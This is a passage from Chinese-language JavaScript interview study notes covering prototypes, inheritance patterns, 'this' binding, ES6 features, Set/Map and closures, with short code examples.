栈？（高频）</h2><ul><li>栈：<strong>原始数据类型</strong>（Undefined、Null、Boolean、Number、String）</li><li>堆：<strong>引用数据类型</strong>（对象、数组和函数）</li></ul><p>两种类型的区别是：存储位置不同。</p><ul><li>原始数据类型直接存储在栈（stack）中的简单数据段，<strong>占据空间小、大小固定</strong>，属于被频繁使用数据。</li><li>引用数据类型存储在堆（heap）中的对象，占据空间大、大小不固定。如果存储在栈中，将会影响程序运行的性能；引用数据类型在<strong>栈中存储了指针</strong>，指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其在栈中的地址，然后从堆中获得实体。</li></ul><p><img src="https://i.loli.net/2021/07/04/ypQAzYnGjm2FeuK.jpg" alt="Snipaste_2021-07-04_19-37-40.jpg"></p><h3 id="判断输出"><a href="#判断输出" class="headerlink" title="判断输出"></a>判断输出</h3><p>变量a是一个<code>primitive值</code>（原生值），一个primitive值不会拥有自己的属性与方法。</p><p>变量b是一个primitive类型（primitive类型：Undefined, Null, Boolean, String, Number）的实例，它有一个值为实例化String类型时所传入的参数的内置属性[[PrimitiveValue]]，这个String的实例享有String.prototype上所有的方法。</p><p>变量a为字符串，存储在常量池中；变量b为对象，存储在堆区中。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">a.a=<span class="number">1</span></span><br><span class="line"><span class="built_in">console</span>.log(a.a) <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b=<span class="string">&quot;b&quot;</span></span><br><span class="line">b.b=<span class="number">1</span></span><br><span class="line"><span class="built_in">console</span>.log(b.b) <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><h2 id="JavaScript-原型，原型链？（高频）"><a href="#JavaScript-原型，原型链？（高频）" class="headerlink" title="JavaScript 原型，原型链？（高频）"></a>JavaScript 原型，原型链？（高频）</h2><p>可以经常回顾 <a href="https://juejin.cn/post/6844903749345886216">深入JavaScript系列（六）：原型与原型链</a>。</p><p><strong>prototype：</strong>js 使用构造函数来新建一个对象，每个<strong>构造函数</strong>对象的内部都会有一个<code>prototype</code>属性，它是一个对象，包含了可以由该构造函数的所有实例共享的属性和方法。</p><p><strong>__proto__(原型）</strong>: 对象中固有的__proto__属性，该属性指向对象的 prototype 原型属性。</p><p>获取对象的原型的三种方法：</p><ul><li><code>p.__proto__</code></li><li><code>p.constructor.prototype</code></li><li><code>Object.getPrototypeOf(p)</code></li></ul><p><strong>constructor</strong>：每个原型都有一个<code>constructor</code>属性指向关联的构造函数。</p><p><strong>原型链</strong>：当我们访问一个对象的属性时，如果这个对象内部不存在这个属性，就会去它的原型对象里找这个属性，这个原型对象又会有自己的原型，于是就这样一直找下去，这就是原型链的概念（将原型连成一条链）。原型链的尽头一般来说都是 Object.prototype（null），这也是新建的对象为什么能够使用 toString() 等方法的原因。</p><p><strong>特点：</strong>JavaScript 对象是通过引用来传递的，我们创建的每个新对象实体中并没有一份属于自己的原型副本。当我们<strong>修改原型时，与之相关的对象也会继承这一改变</strong>。</p><p><img src="https://i.loli.net/2021/09/10/vgMdz1XLq3HCEuD.png" alt="image.png"></p><h2 id="JavaScript-继承的实现方式？（高频）"><a href="#JavaScript-继承的实现方式？（高频）" class="headerlink" title="JavaScript 继承的实现方式？（高频）"></a>JavaScript 继承的实现方式？（高频）</h2><p>具体可参考<a href="https://juejin.cn/post/6844903475021627400">JS原型链与继承别再被问倒了</a>。</p><p>（1）以<strong>原型链</strong>的方式。缺点是在包含有引用类型的数据时，会被所有的实例对象所共享，容易造成修改的混乱。还有就是在创建子类型的时候不能向超类型传递参数。</p><p>（2）借用<strong>构造函数</strong>。通过在子类型的函数中调用超类型的构造函数实现，保证了原型链中引用类型值的独立，不再被所有实例共享；解决了不能向超类型传递参数的缺点。<strong>缺点</strong>：无法实现函数方法的复用，并且超类型原型定义的方法子类型也没有办法访问到。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.colors = [<span class="string">&quot;red&quot;</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;green&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Father.call(<span class="built_in">this</span>);<span class="comment">//继承了Father,且向父类型传递参数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> instance1 = <span class="keyword">new</span> Son();</span><br><span class="line">instance1.colors.push(<span class="string">&quot;black&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(instance1.colors);<span class="comment">//&quot;red,blue,green,black&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance2 = <span class="keyword">new</span> Son();</span><br><span class="line"><span class="built_in">console</span>.log(instance2.colors);<span class="comment">//&quot;red,blue,green&quot; 可见引用类型值是独立的</span></span><br></pre></td></tr></table></figure><p>（3）<strong>组合继承（高频）</strong>。组合继承是将原型链和借用构造函数组合起来使用的一种方式。核心是在子类的构造函数中通过 <code>Parent.call(this)</code> 继承父类的属性，然后改变子类的原型为 <code>new Parent()</code> 来继承父类的函数。<strong>优点</strong>：构造函数可以传参，不会与父类引用属性共享，可以复用父类的函数。<strong>缺点</strong>是继承父类函数时调用了父类构造函数，导致子类的原型上多了不需要的父类属性，存在内存上的浪费。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.val = value</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.getValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.val)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  Parent.call(<span class="built_in">this</span>, value)</span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = <span class="keyword">new</span> Parent()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child = <span class="keyword">new</span> Child(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">child.getValue() <span class="comment">// 1</span></span><br><span class="line">child <span class="keyword">instanceof</span> Parent <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/25vMPF7DaKJxwU8.png" alt="image.png"></p><p>（4）<strong>原型式继承</strong>。原型式继承的主要思路就是基于已有的对象来创建新的对象，实现的原理是<strong>在函数内部先创建一个临时性的构造函数，然后将传入的对象作为这个构造函数的原型，最后返回这个临时类型的一个新实例。</strong>这种继承的思路主要是为了对某个对象实现一种简单继承。缺点与原型链方式相同，可能带来一些共享数据的问题。</p><p>在 ECMAScript5 中，通过新增 <strong>object.create()</strong> 方法规范化了上面的原型式继承。接收两个参数:</p><ul><li>一个用作新对象原型的对象。</li><li>(可选的)一个为新对象定义额外属性的对象：每个属性都是通过自己的描述符定义的，以这种方式指定的任何属性都会覆盖原型对象上的同名属性。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">F.prototype = o;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> F();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（5）<strong>寄生式继承</strong>。寄生式继承的思路是<strong>创建一个用于封装继承过程的函数，通过传入一个对象，然后复制一个对象的副本，然后对象进行扩展，最后返回这个对象。</strong>这个扩展的过程就可以理解是一种继承。这种继承的优点是对一个简单对象实现继承，如果这个对象不是我们的自定义类型时。缺点是没有办法实现函数的复用而降低效率。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createAnother</span>(<span class="params">original</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> clone = object(original);<span class="comment">//通过调用object函数创建一个新对象</span></span><br><span class="line">clone.sayHi = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//以某种方式来增强这个对象</span></span><br><span class="line">alert(<span class="string">&quot;hi&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">return</span> clone;<span class="comment">//返回这个对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（6）<strong>寄生式组合继承</strong>。组合继承的缺点就是使用超类型的实例做为子类型的原型，导致添加了不必要的原型属性（无论什么情况下都会调用两次父类构造函数: 一次是在创建子类型原型的时候, 另一次是在子类型构造函数内部）。寄生式组合继承的核心是<strong>将父类的原型赋值给了子类，并且将构造函数设置为子类</strong>，这样既解决了无用的父类属性问题，还能正确的找到子类的构造函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在组合继承的代码基础上，Child.prototype = new Parent() 改为:</span></span><br><span class="line">Child.prototype = <span class="built_in">Object</span>.create(Parent.prototype, &#123;</span><br><span class="line">  <span class="attr">constructor</span>: &#123;</span><br><span class="line">    <span class="attr">value</span>: Child,</span><br><span class="line">    <span class="attr">enumerable</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">writable</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">configurable</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/ZqK1HvNfya8PXn5.png" alt="image.png"></p><p>（7）<strong>Class 继承</strong>。<strong>ES6</strong> 可以使用 <code>class</code> 去实现继承，其实就是<strong>寄生组合继承的语法糖</strong>。核心在于使用 <code>extends</code> 表明继承自哪个父类，并且在子类构造函数中必须调用 <code>super</code>，因为这段代码可以看成 <code>Parent.call(this, value)</code>。（class 的本质是函数）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">value</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.val = value</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getValue</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.val)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">value</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(value)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> child = <span class="keyword">new</span> Child(<span class="number">1</span>)</span><br><span class="line">child.getValue() <span class="comment">// 1</span></span><br><span class="line">child <span class="keyword">instanceof</span> Parent <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="Class-extends-相比-Object-create-的优点？"><a href="#Class-extends-相比-Object-create-的优点？" class="headerlink" title="Class extends 相比 Object.create() 的优点？"></a>Class extends 相比 Object.create() 的优点？</h3><p>核心思想： </p><ul><li>extends：内部相当于设置了Son.prototype = object.create(Father.prototype); </li><li>super()：内部相当于调用了Father.call(this);</li></ul><p>优点：</p><ul><li>创建的子类实例可以传参</li><li>子类实例不共享父类构造函数的引用属性</li></ul><h2 id="谈谈-This-对象的理解（高频）"><a href="#谈谈-This-对象的理解（高频）" class="headerlink" title="谈谈 This 对象的理解（高频）"></a>谈谈 This 对象的理解（高频）</h2><p>this 对象是<strong>执行上下文</strong>中的一个属性，它指向最后一次调用这个方法的对象。this 指向可以通过四种调用模式判断：</p><ul><li><strong>函数</strong>调用模式。当一个函数直接作为函数来调用时，this 指向全局对象。</li><li><strong>方法</strong>调用模式。当一个函数作为一个对象的方法来调用时，this 指向这个对象。</li><li><strong>apply、call 和 bind</strong> 调用模式，这三个方法都可以显示的指定调用函数的 this 指向。</li><li><strong>构造器</strong>调用模式。如果一个函数用 new 调用，函数执行前会新创建一个对象，this 指向这个新创建的对象。</li></ul><p>这四种方式优先级从上往下递增。</p><h3 id="call-、apply-和-bind-的区别？"><a href="#call-、apply-和-bind-的区别？" class="headerlink" title="call() 、apply() 和 bind() 的区别？"></a>call() 、apply() 和 bind() 的区别？</h3><ul><li><p>apply 接受两个参数，第一个参数指定了函数体内 this 指向，第二个参数为一个集合，可以为数组，也可以为类数组。集合中的元素作为参数传递给被调用的函数。（马上执行）</p></li><li><p>call 参数数量不固定，第一个参数代表函数体内的 this 指向，从第二个参数开始往后，每个参数被依次传入函数。（马上执行）</p></li><li><p>bind 通过传入一个对象，返回一个 this 绑定了传入对象的新函数，（不会马上执行）。<strong>这个函数的 this 指向除了使用 new 会被改变，其他情况下都不会改变。</strong></p></li></ul><h3 id="箭头函数的-this"><a href="#箭头函数的-this" class="headerlink" title="箭头函数的 this"></a>箭头函数的 this</h3><p>箭头函数没有 this，它会捕获自己在<strong>定义时</strong>（注意是定义时，不是调用时）所处的<strong>外层执行环境的this</strong>，并继承这个 this 值。所以，箭头函数中 this 的指向在它被定义的时候就已经确定，不会改变。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> id = <span class="string">&#x27;Global&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// setTimeout中使用普通函数</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.id);</span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// setTimeout中使用箭头函数</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.id);</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun1.call(&#123;<span class="attr">id</span>: <span class="string">&#x27;Obj&#x27;</span>&#125;);     <span class="comment">// &#x27;Global&#x27;</span></span><br><span class="line">fun2.call(&#123;<span class="attr">id</span>: <span class="string">&#x27;Obj&#x27;</span>&#125;);     <span class="comment">// &#x27;Obj&#x27; 箭头函数的 this 在定义时就确定了，它继承了外层 fun2 的执行环境中的 this，所以输出 &#x27;Obj&#x27; 。</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> id = <span class="string">&#x27;GLOBAL&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="string">&#x27;OBJ&#x27;</span>,</span><br><span class="line">  <span class="attr">a</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.id);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">b</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.a();    <span class="comment">// &#x27;OBJ&#x27;</span></span><br><span class="line">obj.b();    <span class="comment">// &#x27;GLOBAL&#x27; 箭头函数中的 this 实际是继承**定义时所处的全局执行环境中 this** ，所以指向 Window 对象。</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.type = <span class="string">&#x27;animal&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">says</span>(<span class="params">say</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>.type + <span class="string">&#x27;says&#x27;</span> + say)</span><br><span class="line">        &#125;,<span class="number">1000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> animal = <span class="keyword">new</span> Animal()</span><br><span class="line">animal.says(<span class="string">&#x27;hi&#x27;</span>) <span class="comment">// undefined says hi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用箭头函数：</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>() </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = <span class="string">&#x27;animal&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">says</span>(<span class="params">say</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>.type + <span class="string">&#x27; says &#x27;</span> + say)</span><br><span class="line">        &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> animal = <span class="keyword">new</span> Animal()</span><br><span class="line">animal.says(<span class="string">&#x27;hi&#x27;</span>) <span class="comment">// animal says hi</span></span><br></pre></td></tr></table></figure><h2 id="new-的过程？（高频）"><a href="#new-的过程？（高频）" class="headerlink" title="new 的过程？（高频）"></a>new 的过程？（高频）</h2><p>实现见：[跳转](##实现 new（高频）)</p><ol><li>首先创建了一个新的空对象。</li><li>设置原型，将对象的原型（[[Prototype]]）设置为构造函数的 prototype 对象。</li><li>让函数的 this 指向新对象，执行构造函数的代码（为这个新对象添加属性）。</li><li>判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象。</li></ol><h2 id="ES6-新特性？（高频）"><a href="#ES6-新特性？（高频）" class="headerlink" title="ES6 新特性？（高频）"></a>ES6 新特性？（高频）</h2><p><code>ECMAScript</code>和 <code>JavaScript</code>的关系是，前者是后者的规格，后者是前者的一种实现。</p><ul><li><strong>let 与 const</strong> ：新增两个重要的<code>JavaScript</code>关键字，<code>ES6</code>明确规定，代码块内如果存在<code>let</code>或者 <code>const</code>，代码块会对这些命令声明的变量从<strong>块的开始</strong>就形成一个<strong>封闭作用域</strong>。[=&gt;三者区别](##let，const，var 区别？（高频）)</li><li><strong>解构赋值</strong>和<strong>拓展运算符</strong>：<code>ES6</code>允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构赋值。<a href="###...%EF%BC%88%E6%8B%93%E5%B1%95%EF%BC%89%E8%BF%90%E7%AE%97%E7%AC%A6">=&gt;查看更多</a></li><li><strong>箭头函数</strong>：<code>ES6</code>中，箭头函数就是函数的一种简写形式。<a href="##%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0%E5%92%8C%E6%99%AE%E9%80%9A%E5%87%BD%E6%95%B0%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%88%E9%AB%98%E9%A2%91%EF%BC%89">=&gt;箭头函数和普通函数的区别</a></li><li><strong>Symbol</strong>：<code>ES6</code>引入了一种新的原始数据类型<code>Symbol</code>，表示独一无二的值，最大的用法是用来定义对象的唯一属性名。</li><li><strong>set 和 map</strong>：[=&gt;查看更多](##set 和 map )</li><li><strong>class 类</strong>：通过<code>class</code>关键字，可以定义类。ES6 可以使用 <code>class</code> 去实现继承，其实就是<strong>寄生组合继承的语法糖</strong>。（不是新的对象继承模型）[=&gt;查看更多](##JavaScript 继承的实现方式？（高频）)</li><li><strong>promise</strong>：[=&gt;查看更多](##Promise 相关（高频）)</li><li><strong>proxy</strong>：可以用来自定义对象中的操作，替换原本的 <code>Object.defineProperty</code> 来实现数据响应式。</li><li><strong>模板字符串</strong>：ES6 提出了“模板语法”的概念。<ul><li>在模板字符串中，空格、缩进、换行都会被保留（无障碍地直接写 html 代码）</li><li>模板字符串完全支持“运算”式的表达式，可以在${}里完成一些计算</li></ul></li></ul><h3 id="变量的解构赋值"><a href="#变量的解构赋值" class="headerlink" title="变量的解构赋值"></a>变量的解构赋值</h3><ol><li>数组：<code>let [a, b, c, d] = [1, 2, 3, 4]</code>。也可嵌套、忽略进行解构。</li><li>对象：<code>let &#123;n:name, g:gender, a:age&#125; = &#123;name: &#39;jack&#39;, age: 18, gender: &#39;男&#39;&#125;</code>。等号左边的顺序是随意的， 系统会根据你的变量名， 优先去对象中寻找与你对象名相同的键， 将它的值赋值给这个变量。</li><li>字符串：<code>let [a, b, c, d] = &#39;word&#39;</code></li></ol><h3 id="…（拓展）运算符"><a href="#…（拓展）运算符" class="headerlink" title="…（拓展）运算符"></a>…（拓展）运算符</h3><p>参考自<a href="https://juejin.cn/post/6940945178899251230#heading-25">https://juejin.cn/post/6940945178899251230#heading-25</a></p><p>对象：取出参数对象中的所有<strong>可遍历属性</strong>，拷贝到当前对象之中。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> bar = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> baz = &#123; ...bar &#125;; <span class="comment">// &#123; a: 1, b: 2 &#125;</span></span><br><span class="line"><span class="comment">//等价于</span></span><br><span class="line"><span class="keyword">let</span> baz = <span class="built_in">Object</span>.assign(&#123;&#125;, bar); <span class="comment">// &#123; a: 1, b: 2 &#125;</span></span><br></pre></td></tr></table></figure><p>数组：</p><ol><li><p>将数组转换为参数序列</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> numbers = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">add(...numbers) <span class="comment">// 3</span></span><br></pre></td></tr></table></figure></li><li><p>复制数组（浅拷贝）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr1 = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">const</span> arr2 = [...arr1];</span><br><span class="line"><span class="built_in">console</span>.log(arr2) <span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure></li><li><p>与解构赋值结合起来，用于生成数组（但是展开运算符必须放在最后一位）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">let</span> [c,...d] = a</span><br><span class="line"><span class="built_in">console</span>.log(c); <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">console</span>.log(d); <span class="comment">// [2,3,4,5,6]</span></span><br></pre></td></tr></table></figure></li><li><p>将字符串转为数组</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[...<span class="string">&#x27;zxx&#x27;</span>] <span class="comment">// [&quot;z&quot;, &quot;x&quot;, &quot;x&quot;]</span></span><br></pre></td></tr></table></figure></li><li><p>将具有 Iterator 接口的对象转为数组</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> nodelist = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log([...nodelist])</span><br></pre></td></tr></table></figure></li><li><p>替代 apply</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a,b,c</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a,b,c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> args = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="comment">// 以下三种方法结果相同</span></span><br><span class="line">f.apply(<span class="literal">null</span>,args)</span><br><span class="line">f(...args)</span><br><span class="line">f(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li></ol><h3 id="set-和-map"><a href="#set-和-map" class="headerlink" title="set 和 map"></a>set 和 map</h3><p><strong>Set：</strong>（ES6新增，类似数组）</p><ul><li>成员唯一、无序且不重复。（可以去重 NaN ）</li><li>[value, value]，键值与键名一致（或者说只有键值，没有键名）。</li><li>可以遍历，方法有：add、delete、has。</li></ul><p><strong>WeakSet：</strong></p><ul><li><strong>成员只能是对象</strong>。</li><li>成员都是弱引用，可以<strong>被垃圾回收机制回收</strong>，可以用来保存DOM节点，不容易造成内存泄漏。</li><li>不能遍历，方法有：add、delete、has。</li></ul><p><strong>Map：</strong></p><ul><li>本质上是键值对的集合。但是“键”的范围不限于字符串，各种类型的值（包括对象）都可以当作键。</li><li>可以遍历，方法很多可以跟各种数据格式转换。</li></ul><p><strong>WeakMap：</strong></p><ul><li><strong>只接受对象作为键名</strong>（null除外）。</li><li>键名是弱引用，键值可以是任意的，键名所指向的对象可以被垃圾回收，此时键名无效。</li><li>不能遍历，方法有：get、set、has、delete。</li></ul><h3 id="map-和-object-的区别"><a href="#map-和-object-的区别" class="headerlink" title="map 和 object 的区别"></a>map 和 object 的区别</h3><p>参考自 <a href="https://www.jianshu.com/p/94cf51649517">Map和Object的区别</a></p><ul><li><p>Object 本质上是哈希结构的键值对的集合，它只能用字符串、数字或者Symbol等简单数据类型当作键。而 Map 类继承了Object，并对Object功能做了一些拓展，Map的键可以是<strong>任意的数据类型</strong>。</p></li><li><p>Object 其实就是在堆开辟了一块内存，而 Map 的键存的就是这块内存的地址。只要地址不一样，就是两个不同的键，这就解决了<strong>同名属性的碰撞问题</strong>。</p></li><li><p>Map实现了<strong>迭代器</strong>，可用 for…of 遍历，而Object不行。</p></li></ul><h3 id="ES5-实现-ES6-块级作用域"><a href="#ES5-实现-ES6-块级作用域" class="headerlink" title="ES5 实现 ES6 块级作用域"></a>ES5 实现 ES6 块级作用域</h3><p>通过立即执行函数实现 let：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">//3</span></span><br><span class="line">&#125;)()</span><br><span class="line"><span class="built_in">console</span>.log(a)<span class="comment">//2</span></span><br></pre></td></tr></table></figure><p>通过<code>Object.defineProperty(obj, prop, description)</code>实现 const：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_const</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">window</span>[key] = value;</span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, key, &#123;</span><br><span class="line">        <span class="attr">enumerable</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">configurable</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">get</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">set</span>: <span class="function"><span class="keyword">function</span> (<span class="params">newValue</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (newValue !== value) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">&quot;这是只读变量，不可修改&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="什么是闭包？（高频）"><a href="#什么是闭包？（高频）" class="headerlink" title="什么是闭包？（高频）"></a>什么是闭包？（高频）</h2><p>闭包：<strong>有权访问另一个函数作用域中变量的函数。</strong> ——《JavaScript高级程序设计》</p><p>创建闭包最常见的方式：<strong>（函数 A 内部有一个函数 B，函数 B 可以访问到函数 A 中的变量，那么函数 B 就是闭包。）</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line">  <span class="built_in">window</span>.B = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(a)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span 